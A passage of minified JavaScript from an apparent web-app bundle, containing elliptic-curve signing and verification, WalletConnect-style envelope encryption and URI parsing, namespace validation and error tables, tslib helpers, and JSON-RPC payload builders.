V=M===2||M===3?C+e.n:C;if(V>=n.ORDER)throw new Error("recovery id 2 or 3 invalid");const F=(M&1)===0?"02":"03",q=u.fromHex(F+g(V)),Q=c(V),te=l(-N*Q),se=l(U*Q),le=u.BASE.multiplyAndAddUnsafe(q,te,se);if(!le)throw new Error("point at infinify");return le.assertValidity(),le}hasHighS(){return E(this.s)}normalizeS(){return this.hasHighS()?new m(this.r,l(-this.s),this.recovery):this}toDERRawBytes(){return Ba(this.toDERHex())}toDERHex(){return _i.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return Ba(this.toCompactHex())}toCompactHex(){return g(this.r)+g(this.s)}}const x={isValidPrivateKey(j){try{return f(j),!0}catch{return!1}},normPrivateKeyToScalar:f,randomPrivateKey:()=>{const j=eI(e.n);return ML(e.randomBytes(j),e.n)},precompute(j=8,A=u.BASE){return A._setWindowSize(j),A.multiply(BigInt(3)),A}};function S(j,A=!0){return u.fromPrivateKey(j).toRawBytes(A)}function O(j){const A=oo(j),C=typeof j=="string",U=(A||C)&&j.length;return A?U===i||U===o:C?U===2*i||U===2*o:j instanceof u}function $(j,A,C=!0){if(O(j))throw new Error("first arg must be private key");if(!O(A))throw new Error("second arg must be public key");return u.fromHex(A).multiply(f(j)).toRawBytes(C)}const R=e.bits2int||function(j){if(j.length>8192)throw new Error("input is too large");const A=eo(j),C=j.length*8-e.nBitLength;return C>0?A>>BigInt(C):A},T=e.bits2int_modN||function(j){return l(R(j))},D=sw(e.nBitLength);function B(j){return Ci("num < 2^"+e.nBitLength,j,$i,D),La(j,e.nByteLength)}function k(j,A,C=G){if(["recovered","canonical"].some(he=>he in C))throw new Error("sign() legacy options not supported");const{hash:U,randomBytes:M}=e;let{lowS:N,prehash:V,extraEntropy:F}=C;N==null&&(N=!0),j=Jn("msgHash",j),CE(C),V&&(j=Jn("prehashed msgHash",U(j)));const q=T(j),Q=f(A),te=[B(Q),B(q)];if(F!=null&&F!==!1){const he=F===!0?M(n.BYTES):F;te.push(Jn("extraEntropy",he))}const se=Ic(...te),le=q;function pe(he){const fe=R(he);if(!y(fe))return;const xe=c(fe),Oe=u.BASE.multiply(fe).toAffine(),Pe=l(Oe.x);if(Pe===$i)return;const Re=l(xe*l(le+Pe*Q));if(Re===$i)return;let Ue=(Oe.x===Pe?0:2)|Number(Oe.y&Ht),Zt=Re;return N&&E(Re)&&(Zt=w(Re),Ue^=1),new m(Pe,Zt,Ue)}return{seed:se,k2sig:pe}}const G={lowS:e.lowS,prehash:!1},W={lowS:e.lowS,prehash:!1};function J(j,A,C=G){const{seed:U,k2sig:M}=k(j,A,C),N=e;return Y_(N.hash.outputLen,N.nByteLength,N.hmac)(U,M)}u.BASE._setWindowSize(8);function ne(j,A,C,U=W){var Re;const M=j;A=Jn("msgHash",A),C=Jn("publicKey",C);const{lowS:N,prehash:V,format:F}=U;if(CE(U),"strict"in U)throw new Error("options.strict was renamed to lowS");if(F!==void 0&&F!=="compact"&&F!=="der")throw new Error("format must be compact or der");const q=typeof M=="string"||oo(M),Q=!q&&!F&&typeof M=="object"&&M!==null&&typeof M.r=="bigint"&&typeof M.s=="bigint";if(!q&&!Q)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let te,se;try{if(Q&&(te=new m(M.r,M.s)),q){try{F!=="compact"&&(te=m.fromDER(M))}catch(Ue){if(!(Ue instanceof _i.Err))throw Ue}!te&&F!=="der"&&(te=m.fromCompact(M))}se=u.fromHex(C)}catch{return!1}if(!te||N&&te.hasHighS())return!1;V&&(A=e.hash(A));const{r:le,s:pe}=te,he=T(A),fe=c(pe),xe=l(he*fe),Oe=l(le*fe),Pe=(Re=u.BASE.multiplyAndAddUnsafe(se,xe,Oe))==null?void 0:Re.toAffine();return Pe?l(Pe.x)===le:!1}return{CURVE:e,getPublicKey:S,getSharedSecret:$,sign:J,verify:ne,ProjectivePoint:u,Signature:m,utils:x}}function sj(t){return{hash:t,hmac:(e,...n)=>Rf(t,e,c5(...n)),randomBytes:Za}}function oj(t,e){const n=r=>ij({...t,...sj(r)});return{...n(e),create:n}}const iI=Q_(BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff")),aj=iI.create(BigInt("-3")),lj=BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),cj=oj({a:aj,b:lj,Fp:iI,n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"),h:BigInt(1),lowS:!1},qc),sI="base10",xn="base16",kr="base64pad",ps="base64url",Vc="utf8",oI=0,Ri=1,Wc=2,uj=0,DE=1,dc=12,ow=32;function hj(){const t=Vy.utils.randomPrivateKey(),e=Vy.getPublicKey(t);return{privateKey:jn(t,xn),publicKey:jn(e,xn)}}function Wy(){const t=Za(ow);return jn(t,xn)}function fj(t,e){const n=Vy.getSharedSecret(pr(t,xn),pr(e,xn)),r=yL(qc,n,void 0,void 0,ow);return jn(r,xn)}function Hh(t){const e=qc(pr(t,xn));return jn(e,xn)}function Xr(t){const e=qc(pr(t,Vc));return jn(e,xn)}function aI(t){return pr(`${t}`,sI)}function ao(t){return Number(jn(t,sI))}function lI(t){return t.replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}function cI(t){const e=t.replace(/-/g,"+").replace(/_/g,"/"),n=(4-e.length%4)%4;return e+"=".repeat(n)}function dj(t){const e=aI(typeof t.type<"u"?t.type:oI);if(ao(e)===Ri&&typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const n=typeof t.senderPublicKey<"u"?pr(t.senderPublicKey,xn):void 0,r=typeof t.iv<"u"?pr(t.iv,xn):Za(dc),i=pr(t.symKey,xn),o=W_(i,r).encrypt(pr(t.message,Vc)),l=uI({type:e,sealed:o,iv:r,senderPublicKey:n});return t.encoding===ps?lI(l):l}function pj(t){const e=pr(t.symKey,xn),{sealed:n,iv:r}=Oc({encoded:t.encoded,encoding:t.encoding}),i=W_(e,r).decrypt(n);if(i===null)throw new Error("Failed to decrypt");return jn(i,Vc)}function gj(t,e){const n=aI(Wc),r=Za(dc),i=pr(t,Vc),o=uI({type:n,sealed:i,iv:r});return e===ps?lI(o):o}function yj(t,e){const{sealed:n}=Oc({encoded:t,encoding:e});return jn(n,Vc)}function uI(t){if(ao(t.type)===Wc)return jn(fc([t.type,t.sealed]),kr);if(ao(t.type)===Ri){if(typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return jn(fc([t.type,t.senderPublicKey,t.iv,t.sealed]),kr)}return jn(fc([t.type,t.iv,t.sealed]),kr)}function Oc(t){const e=(t.encoding||kr)===ps?cI(t.encoded):t.encoded,n=pr(e,kr),r=n.slice(uj,DE),i=DE;if(ao(r)===Ri){const u=i+ow,f=u+dc,d=n.slice(i,u),y=n.slice(u,f),g=n.slice(f);return{type:r,sealed:g,iv:y,senderPublicKey:d}}if(ao(r)===Wc){const u=n.slice(i),f=Za(dc);return{type:r,sealed:u,iv:f}}const o=i+dc,l=n.slice(i,o),c=n.slice(o);return{type:r,sealed:c,iv:l}}function mj(t,e){const n=Oc({encoded:t,encoding:e==null?void 0:e.encoding});return hI({type:ao(n.type),senderPublicKey:typeof n.senderPublicKey<"u"?jn(n.senderPublicKey,xn):void 0,receiverPublicKey:e==null?void 0:e.receiverPublicKey})}function hI(t){const e=(t==null?void 0:t.type)||oI;if(e===Ri){if(typeof(t==null?void 0:t.senderPublicKey)>"u")throw new Error("missing sender public key");if(typeof(t==null?void 0:t.receiverPublicKey)>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:t==null?void 0:t.senderPublicKey,receiverPublicKey:t==null?void 0:t.receiverPublicKey}}function NE(t){return t.type===Ri&&typeof t.senderPublicKey=="string"&&typeof t.receiverPublicKey=="string"}function kE(t){return t.type===Wc}function wj(t){const e=Buffer.from(t.x,"base64"),n=Buffer.from(t.y,"base64");return fc([new Uint8Array([4]),e,n])}function vj(t,e){const[n,r,i]=t.split("."),o=Buffer.from(cI(i),"base64");if(o.length!==64)throw new Error("Invalid signature length");const l=o.slice(0,32),c=o.slice(32,64),u=`${n}.${r}`,f=qc(u),d=wj(e);if(!cj.verify(fc([l,c]),f,d))throw new Error("Invalid signature");return Sy(t).payload}const bj="irn";function lf(t){return(t==null?void 0:t.relay)||{protocol:bj}}function cc(t){const e=_D[t];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${t}`);return e}function Ej(t,e="-"){const n={},r="relay"+e;return Object.keys(t).forEach(i=>{if(i.startsWith(r)){const o=i.replace(r,""),l=t[i];n[o]=l}}),n}function BE(t){if(!t.includes("wc:")){const f=D_(t);f!=null&&f.includes("wc:")&&(t=f)}t=t.includes("wc://")?t.replace("wc://",""):t,t=t.includes("wc:")?t.replace("wc:",""):t;const e=t.indexOf(":"),n=t.indexOf("?")!==-1?t.indexOf("?"):void 0,r=t.substring(0,e),i=t.substring(e+1,n).split("@"),o=typeof n<"u"?t.substring(n):"",l=new URLSearchParams(o),c={};l.forEach((f,d)=>{c[d]=f});const u=typeof c.methods=="string"?c.methods.split(","):void 0;return{protocol:r,topic:xj(i[0]),version:parseInt(i[1],10),symKey:c.symKey,relay:Ej(c),methods:u,expiryTimestamp:c.expiryTimestamp?parseInt(c.expiryTimestamp,10):void 0}}function xj(t){return t.startsWith("//")?t.substring(2):t}function Sj(t,e="-"){const n="relay",r={};return Object.keys(t).forEach(i=>{const o=i,l=n+e+o;t[o]&&(r[l]=t[o])}),r}function LE(t){const e=new URLSearchParams,n=Sj(t.relay);Object.keys(n).sort().forEach(i=>{e.set(i,n[i])}),e.set("symKey",t.symKey),t.expiryTimestamp&&e.set("expiryTimestamp",t.expiryTimestamp.toString()),t.methods&&e.set("methods",t.methods.join(","));const r=e.toString();return`${t.protocol}:${t.topic}@${t.version}?${r}`}function Oh(t,e,n){return`${t}?wc_ev=${n}&topic=${e}`}function Xa(t){const e=[];return t.forEach(n=>{const[r,i]=n.split(":");e.push(`${r}:${i}`)}),e}function _j(t){const e=[];return Object.values(t).forEach(n=>{e.push(...Xa(n.accounts))}),e}function Ij(t,e){const n=[];return Object.values(t).forEach(r=>{Xa(r.accounts).includes(e)&&n.push(...r.methods)}),n}function Oj(t,e){const n=[];return Object.values(t).forEach(r=>{Xa(r.accounts).includes(e)&&n.push(...r.events)}),n}function $j(t){const e={};return t==null||t.forEach(n=>{var r;const[i,o]=n.split(":");e[i]||(e[i]={accounts:[],chains:[],events:[],methods:[]}),e[i].accounts.push(n),(r=e[i].chains)==null||r.push(`${i}:${o}`)}),e}function jE(t,e){e=e.map(r=>r.replace("did:pkh:",""));const n=$j(e);for(const[r,i]of Object.entries(n))i.methods?i.methods=HB(i.methods,t):i.methods=t,i.events=["chainChanged","accountsChanged"];return n}const Pj={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},Tj={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function Ee(t,e){const{message:n,code:r}=Tj[t];return{message:e?`${n} ${e}`:n,code:r}}function ut(t,e){const{message:n,code:r}=Pj[t];return{message:e?`${n} ${e}`:n,code:r}}function Kc(t,e){return!!Array.isArray(t)}function cf(t){return Object.getPrototypeOf(t)===Object.prototype&&Object.keys(t).length}function an(t){return typeof t>"u"}function At(t,e){return e&&an(t)?!0:typeof t=="string"&&!!t.trim().length}function aw(t,e){return e&&an(t)?!0:typeof t=="number"&&!isNaN(t)}function Aj(t,e){const{requiredNamespaces:n}=e,r=Object.keys(t.namespaces),i=Object.keys(n);let o=!0;return Js(i,r)?(r.forEach(l=>{const{accounts:c,methods:u,events:f}=t.namespaces[l],d=Xa(c),y=n[l];(!Js(P_(l,y),d)||!Js(y.methods,u)||!Js(y.events,f))&&(o=!1)}),o):!1}function uf(t){return At(t,!1)&&t.includes(":")?t.split(":").length===2:!1}function Cj(t){if(At(t,!1)&&t.includes(":")){const e=t.split(":");if(e.length===3){const n=e[0]+":"+e[1];return!!e[2]&&uf(n)}}return!1}function Rj(t){function e(n){try{return typeof new URL(n)<"u"}catch{return!1}}try{if(At(t,!1)){if(e(t))return!0;const n=D_(t);return e(n)}}catch{}return!1}function Dj(t){var e;return(e=t==null?void 0:t.proposer)==null?void 0:e.publicKey}function Nj(t){return t==null?void 0:t.topic}function kj(t,e){let n=null;return At(t==null?void 0:t.publicKey,!1)||(n=Ee("MISSING_OR_INVALID",`${e} controller public key should be a string`)),n}function UE(t){let e=!0;return Kc(t)?t.length&&(e=t.every(n=>At(n,!1))):e=!1,e}function Bj(t,e,n){let r=null;return Kc(e)&&e.length?e.forEach(i=>{r||uf(i)||(r=ut("UNSUPPORTED_CHAINS",`${n}, chain ${i} should be a string and conform to "namespace:chainId" format`))}):uf(t)||(r=ut("UNSUPPORTED_CHAINS",`${n}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),r}function Lj(t,e,n){let r=null;return Object.entries(t).forEach(([i,o])=>{if(r)return;const l=Bj(i,P_(i,o),`${e} ${n}`);l&&(r=l)}),r}function jj(t,e){let n=null;return Kc(t)?t.forEach(r=>{n||Cj(r)||(n=ut("UNSUPPORTED_ACCOUNTS",`${e}, account ${r} should be a string and conform to "namespace:chainId:address" format`))}):n=ut("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),n}function Uj(t,e){let n=null;return Object.values(t).forEach(r=>{if(n)return;const i=jj(r==null?void 0:r.accounts,`${e} namespace`);i&&(n=i)}),n}function Mj(t,e){let n=null;return UE(t==null?void 0:t.methods)?UE(t==null?void 0:t.events)||(n=ut("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):n=ut("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),n}function fI(t,e){let n=null;return Object.values(t).forEach(r=>{if(n)return;const i=Mj(r,`${e}, namespace`);i&&(n=i)}),n}function Fj(t,e,n){let r=null;if(t&&cf(t)){const i=fI(t,e);i&&(r=i);const o=Lj(t,e,n);o&&(r=o)}else r=Ee("MISSING_OR_INVALID",`${e}, ${n} should be an object with data`);return r}function Lg(t,e){let n=null;if(t&&cf(t)){const r=fI(t,e);r&&(n=r);const i=Uj(t,e);i&&(n=i)}else n=Ee("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return n}function dI(t){return At(t.protocol,!0)}function zj(t,e){let n=!1;return t?t&&Kc(t)&&t.length&&t.forEach(r=>{n=dI(r)}):n=!0,n}function qj(t){return typeof t=="number"}function Nn(t){return typeof t<"u"&&typeof t!==null}function Hj(t){return!(!t||typeof t!="object"||!t.code||!aw(t.code,!1)||!t.message||!At(t.message,!1))}function Vj(t){return!(an(t)||!At(t.method,!1))}function Wj(t){return!(an(t)||an(t.result)&&an(t.error)||!aw(t.id,!1)||!At(t.jsonrpc,!1))}function Kj(t){return!(an(t)||!At(t.name,!1))}function ME(t,e){return!(!uf(e)||!_j(t).includes(e))}function Gj(t,e,n){return At(n,!1)?Ij(t,e).includes(n):!1}function Yj(t,e,n){return At(n,!1)?Oj(t,e).includes(n):!1}function FE(t,e,n){let r=null;const i=Jj(t),o=Zj(e),l=Object.keys(i),c=Object.keys(o),u=zE(Object.keys(t)),f=zE(Object.keys(e)),d=u.filter(y=>!f.includes(y));return d.length&&(r=Ee("NON_CONFORMING_NAMESPACES",`${n} namespaces keys don't satisfy requiredNamespaces.
      Required: ${d.toString()}
      Received: ${Object.keys(e).toString()}`)),Js(l,c)||(r=Ee("NON_CONFORMING_NAMESPACES",`${n} namespaces chains don't satisfy required namespaces.
      Required: ${l.toString()}
      Approved: ${c.toString()}`)),Object.keys(e).forEach(y=>{if(!y.includes(":")||r)return;const g=Xa(e[y].accounts);g.includes(y)||(r=Ee("NON_CONFORMING_NAMESPACES",`${n} namespaces accounts don't satisfy namespace accounts for ${y}
        Required: ${y}
        Approved: ${g.toString()}`))}),l.forEach(y=>{r||(Js(i[y].methods,o[y].methods)?Js(i[y].events,o[y].events)||(r=Ee("NON_CONFORMING_NAMESPACES",`${n} namespaces events don't satisfy namespace events for ${y}`)):r=Ee("NON_CONFORMING_NAMESPACES",`${n} namespaces methods don't satisfy namespace methods for ${y}`))}),r}function Jj(t){const e={};return Object.keys(t).forEach(n=>{var r;n.includes(":")?e[n]=t[n]:(r=t[n].chains)==null||r.forEach(i=>{e[i]={methods:t[n].methods,events:t[n].events}})}),e}function zE(t){return[...new Set(t.map(e=>e.includes(":")?e.split(":")[0]:e))]}function Zj(t){const e={};return Object.keys(t).forEach(n=>{if(n.includes(":"))e[n]=t[n];else{const r=Xa(t[n].accounts);r==null||r.forEach(i=>{e[i]={accounts:t[n].accounts.filter(o=>o.includes(`${i}:`)),methods:t[n].methods,events:t[n].events}})}}),e}function Qj(t,e){return aw(t,!1)&&t<=e.max&&t>=e.min}function qE(){const t=Fc();return new Promise(e=>{switch(t){case tr.browser:e(Xj());break;case tr.reactNative:e(eU());break;case tr.node:e(tU());break;default:e(!0)}})}function Xj(){return Ja()&&(navigator==null?void 0:navigator.onLine)}async function eU(){if(bs()&&typeof globalThis<"u"&&globalThis!=null&&globalThis.NetInfo){const t=await(globalThis==null?void 0:globalThis.NetInfo.fetch());return t==null?void 0:t.isConnected}return!0}function tU(){return!0}function nU(t){switch(Fc()){case tr.browser:rU(t);break;case tr.reactNative:iU(t);break}}function rU(t){!bs()&&Ja()&&(window.addEventListener("online",()=>t(!0)),window.addEventListener("offline",()=>t(!1)))}function iU(t){bs()&&typeof globalThis<"u"&&globalThis!=null&&globalThis.NetInfo&&(globalThis==null||globalThis.NetInfo.addEventListener(e=>t(e==null?void 0:e.isConnected)))}function sU(){var t;return Ja()&&ki.getDocument()?((t=ki.getDocument())==null?void 0:t.visibilityState)==="visible":!0}const jg={};class Xl{static get(e){return jg[e]}static set(e,n){jg[e]=n}static delete(e){delete jg[e]}}const oU="PARSE_ERROR",aU="INVALID_REQUEST",lU="METHOD_NOT_FOUND",cU="INVALID_PARAMS",pI="INTERNAL_ERROR",lw="SERVER_ERROR",uU=[-32700,-32600,-32601,-32602,-32603],pc={[oU]:{code:-32700,message:"Parse error"},[aU]:{code:-32600,message:"Invalid Request"},[lU]:{code:-32601,message:"Method not found"},[cU]:{code:-32602,message:"Invalid params"},[pI]:{code:-32603,message:"Internal error"},[lw]:{code:-32e3,message:"Server error"}},gI=lw;function hU(t){return uU.includes(t)}function HE(t){return Object.keys(pc).includes(t)?pc[t]:pc[gI]}function fU(t){const e=Object.values(pc).find(n=>n.code===t);return e||pc[gI]}function yI(t,e,n){return t.message.includes("getaddrinfo ENOTFOUND")||t.message.includes("connect ECONNREFUSED")?new Error(`Unavailable ${n} RPC url at ${e}`):t}var Ug={};/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */var Ky=function(t,e){return Ky=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(n,r){n.__proto__=r}||function(n,r){for(var i in r)r.hasOwnProperty(i)&&(n[i]=r[i])},Ky(t,e)};function dU(t,e){Ky(t,e);function n(){this.constructor=t}t.prototype=e===null?Object.create(e):(n.prototype=e.prototype,new n)}var Gy=function(){return Gy=Object.assign||function(e){for(var n,r=1,i=arguments.length;r<i;r++){n=arguments[r];for(var o in n)Object.prototype.hasOwnProperty.call(n,o)&&(e[o]=n[o])}return e},Gy.apply(this,arguments)};function pU(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function gU(t,e,n,r){var i=arguments.length,o=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,l;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")o=Reflect.decorate(t,e,n,r);else for(var c=t.length-1;c>=0;c--)(l=t[c])&&(o=(i<3?l(o):i>3?l(e,n,o):l(e,n))||o);return i>3&&o&&Object.defineProperty(e,n,o),o}function yU(t,e){return function(n,r){e(n,r,t)}}function mU(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function wU(t,e,n,r){function i(o){return o instanceof n?o:new n(function(l){l(o)})}return new(n||(n=Promise))(function(o,l){function c(d){try{f(r.next(d))}catch(y){l(y)}}function u(d){try{f(r.throw(d))}catch(y){l(y)}}function f(d){d.done?o(d.value):i(d.value).then(c,u)}f((r=r.apply(t,e||[])).next())})}function vU(t,e){var n={label:0,sent:function(){if(o[0]&1)throw o[1];return o[1]},trys:[],ops:[]},r,i,o,l;return l={next:c(0),throw:c(1),return:c(2)},typeof Symbol=="function"&&(l[Symbol.iterator]=function(){return this}),l;function c(f){return function(d){return u([f,d])}}function u(f){if(r)throw new TypeError("Generator is already executing.");for(;n;)try{if(r=1,i&&(o=f[0]&2?i.return:f[0]?i.throw||((o=i.return)&&o.call(i),0):i.next)&&!(o=o.call(i,f[1])).done)return o;switch(i=0,o&&(f=[f[0]&2,o.value]),f[0]){case 0:case 1:o=f;break;case 4:return n.label++,{value:f[1],done:!1};case 5:n.label++,i=f[1],f=[0];continue;case 7:f=n.ops.pop(),n.trys.pop();continue;default:if(o=n.trys,!(o=o.length>0&&o[o.length-1])&&(f[0]===6||f[0]===2)){n=0;continue}if(f[0]===3&&(!o||f[1]>o[0]&&f[1]<o[3])){n.label=f[1];break}if(f[0]===6&&n.label<o[1]){n.label=o[1],o=f;break}if(o&&n.label<o[2]){n.label=o[2],n.ops.push(f);break}o[2]&&n.ops.pop(),n.trys.pop();continue}f=e.call(t,n)}catch(d){f=[6,d],i=0}finally{r=o=0}if(f[0]&5)throw f[1];return{value:f[0]?f[1]:void 0,done:!0}}}function bU(t,e,n,r){r===void 0&&(r=n),t[r]=e[n]}function EU(t,e){for(var n in t)n!=="default"&&!e.hasOwnProperty(n)&&(e[n]=t[n])}function Yy(t){var e=typeof Symbol=="function"&&Symbol.iterator,n=e&&t[e],r=0;if(n)return n.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&r>=t.length&&(t=void 0),{value:t&&t[r++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function mI(t,e){var n=typeof Symbol=="function"&&t[Symbol.iterator];if(!n)return t;var r=n.call(t),i,o=[],l;try{for(;(e===void 0||e-- >0)&&!(i=r.next()).done;)o.push(i.value)}catch(c){l={error:c}}finally{try{i&&!i.done&&(n=r.return)&&n.call(r)}finally{if(l)throw l.error}}return o}function xU(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(mI(arguments[e]));return t}function SU(){for(var t=0,e=0,n=arguments.length;e<n;e++)t+=arguments[e].length;for(var r=Array(t),i=0,e=0;e<n;e++)for(var o=arguments[e],l=0,c=o.length;l<c;l++,i++)r[i]=o[l];return r}function $c(t){return this instanceof $c?(this.v=t,this):new $c(t)}function _U(t,e,n){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var r=n.apply(t,e||[]),i,o=[];return i={},l("next"),l("throw"),l("return"),i[Symbol.asyncIterator]=function(){return this},i;function l(g){r[g]&&(i[g]=function(E){return new Promise(function(w,b){o.push([g,E,w,b])>1||c(g,E)})})}function c(g,E){try{u(r[g](E))}catch(w){y(o[0][3],w)}}function u(g){g.value instanceof $c?Promise.resolve(g.value.v).then(f,d):y(o[0][2],g)}function f(g){c("next",g)}function d(g){c("throw",g)}function y(g,E){g(E),o.shift(),o.length&&c(o[0][0],o[0][1])}}function IU(t){var e,n;return e={},r("next"),r("throw",function(i){throw i}),r("return"),e[Symbol.iterator]=function(){return this},e;function r(i,o){e[i]=t[i]?function(l){return(n=!n)?{value:$c(t[i](l)),done:i==="return"}:o?o(l):l}:o}}function OU(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],n;return e?e.call(t):(t=typeof Yy=="function"?Yy(t):t[Symbol.iterator](),n={},r("next"),r("throw"),r("return"),n[Symbol.asyncIterator]=function(){return this},n);function r(o){n[o]=t[o]&&function(l){return new Promise(function(c,u){l=t[o](l),i(c,u,l.done,l.value)})}}function i(o,l,c,u){Promise.resolve(u).then(function(f){o({value:f,done:c})},l)}}function $U(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function PU(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var n in t)Object.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e}function TU(t){return t&&t.__esModule?t:{default:t}}function AU(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function CU(t,e,n){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,n),n}const RU=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return Gy},__asyncDelegator:IU,__asyncGenerator:_U,__asyncValues:OU,__await:$c,__awaiter:wU,__classPrivateFieldGet:AU,__classPrivateFieldSet:CU,__createBinding:bU,__decorate:gU,__exportStar:EU,__extends:dU,__generator:vU,__importDefault:TU,__importStar:PU,__makeTemplateObject:$U,__metadata:mU,__param:yU,__read:mI,__rest:pU,__spread:xU,__spreadArrays:SU,__values:Yy},Symbol.toStringTag,{value:"Module"})),DU=Mx(RU);var wi={},VE;function NU(){if(VE)return wi;VE=1,Object.defineProperty(wi,"__esModule",{value:!0}),wi.isBrowserCryptoAvailable=wi.getSubtleCrypto=wi.getBrowerCrypto=void 0;function t(){return(globalThis==null?void 0:globalThis.crypto)||(globalThis==null?void 0:globalThis.msCrypto)||{}}wi.getBrowerCrypto=t;function e(){const r=t();return r.subtle||r.webkitSubtle}wi.getSubtleCrypto=e;function n(){return!!t()&&!!e()}return wi.isBrowserCryptoAvailable=n,wi}var vi={},WE;function kU(){if(WE)return vi;WE=1,Object.defineProperty(vi,"__esModule",{value:!0}),vi.isBrowser=vi.isNode=vi.isReactNative=void 0;function t(){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"}vi.isReactNative=t;function e(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}vi.isNode=e;function n(){return!t()&&!e()}return vi.isBrowser=n,vi}var KE;function BU(){return KE||(KE=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=DU;e.__exportStar(NU(),t),e.__exportStar(kU(),t)}(Ug)),Ug}var LU=BU();function Zr(t=3){const e=Date.now()*Math.pow(10,t),n=Math.floor(Math.random()*Math.pow(10,t));return e+n}function Zs(t=6){return BigInt(Zr(t))}function ys(t,e,n){return{id:n||Zr(),jsonrpc:"2.0",method:t,params:e}}function Lf(t,e){return{id:t,jsonrpc:"2.0",result:e}}function 